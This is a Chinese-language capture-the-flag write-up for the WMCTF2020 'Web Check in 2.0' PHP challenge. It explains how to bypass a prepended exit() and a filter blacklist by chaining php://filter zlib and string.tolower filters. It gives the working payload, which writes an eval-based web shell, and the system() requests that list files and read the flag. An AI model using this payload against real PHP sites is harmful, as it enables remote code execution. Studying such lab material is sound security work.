---
title: '[WMCTF2020]Web Check in 2.0'
date: 2024-11-06 19:23:40
tags: 
      - php伪协议
      - 死亡绕过
categories: 刷题笔记
---

## [WMCTF2020]Web Check in 2.0

我们进入题目看到一大串代码

```php
string(62) "Sandbox:/var/www/html/sandbox/ec53bc853c0c94f2bf546edd1a265425" <?php
//PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/sandbox/' . md5($_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
var_dump("Sandbox:".$sandbox);
highlight_file(__FILE__);
if(isset($_GET['content'])) {
    $content = $_GET['content'];
    if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
         die('hacker');
    if(file_exists($content))
        require_once($content);
    file_put_contents($content,'<?php exit();'.$content);
}
```

先根据remote_addr给每个人创建一个沙盒，然后把工作目录切换至该沙盒里，防止影响其他环境。然后存在一个参数content，里面过滤了一些方法比如base64、quoted之类的，然后检验到文件$content存在后，会require_once它，不过会在其中写入`<?php exit();`

所以这道题考的就是死亡绕过了

[关于file_put_contents的一些小测试](https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/)

由于吧base64过滤了，就只剩下**字符串过滤器中的部分**和**压缩过滤器**以及**加密过滤器**，所以可以考虑从这几个过滤器入手

我们使用`zlib`的`zlib.deflate`和`zlib.inflate`，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit

简单来说就是通过压缩和解压进行绕过

payload:

```php
?content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[1]);?>/resource=123.php
```

然后我们执行命令

```php
?content=123.php&1=system('ls /');
```

不过执行一次后，文件就消失了，我们我们需要重新上传shell在执行命令

得到flag

```
?content=123.php&1=system(%22cat%20../../../../../flag_2233_elkf3ifj34ij3orf3fk4%22);
```

![image-20241106195856052](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411061959172.png)
